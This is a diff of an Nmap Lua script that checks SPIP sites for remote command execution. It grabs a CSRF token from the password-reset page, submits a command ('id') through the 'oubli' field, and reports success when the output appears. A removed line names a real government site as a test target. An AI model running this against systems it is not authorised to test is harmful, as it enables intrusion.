@@ -1,5 +1,4 @@
 local string = require "string"
-local httpspider = require "httpspider"
 local http = require "http"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
@@ -74,20 +73,10 @@ local opts = {header={}}
 opts["header"]["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'
 opts["header"]["Accept"] = '*/*' -- 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
 
-
-    --local target = "https://mesdemarches.agriculture.gouv.fr" -- Remplacez par l'URL de base de l'application SPIP que vous souhaitez tester
-    local command = "id" -- Remplacez par la commande que vous souhaitez exécuter
-
-    -- Définition du chemin et du contenu du fichier à écrire
-    local file_path = "/sdcard/spip.html"
-
-    -- Ouverture du fichier en mode écriture
-    local file = io.open(file_path, "w")
-
+    local command = "id"
     local response = http.get(host,port,"/spip.php?page=spip_pass",opts,nil,"")
     local html = response.body
 
-    -- Définition de la regex pour extraire la valeur de la balise input
     local regex = "<input[^>]+name='formulaire_action_args'[^>]+value='([^']+)'"
     local csrf_value = string.match(html, regex)
     -- print(csrf_value)
@@ -106,16 +95,10 @@ opts["header"]["Accept"] = '*/*' -- 'text/html,application/xhtml+xml,application
             
             local html2 = response.body
             -- print(html2)
-           file:write(html2)
-
-
-    -- Définition de la regex pour extraire la valeur de la balise input
-     local regex2 = "<input[^>]+name='oubli'[^>]+value=\"([^>]+)\""
-
-    -- Recherche des textes dans les balises input avec la regex
+           
+    local regex2 = "<input[^>]+name='oubli'[^>]+value=\"([^>]+)\""
     local value = string.match(html2, regex2)
     -- print(value)
-    -- Vérification si des correspondances ont été trouvées
     if value then
         vuln.state = vulns.STATE.EXPLOIT
   table.insert(vuln.exploit_results,
@@ -128,10 +111,7 @@ opts["header"]["Accept"] = '*/*' -- 'text/html,application/xhtml+xml,application
     stdnse.debug1("[-]Command Not Found !"))
          return report:make_output(vuln)
     end
-
-        -- Fermeture du fichier
-       file:close()
-        end
+    end
     else
         stdnse.debug1("[-] Unable to find Anti-CSRF token")
     end
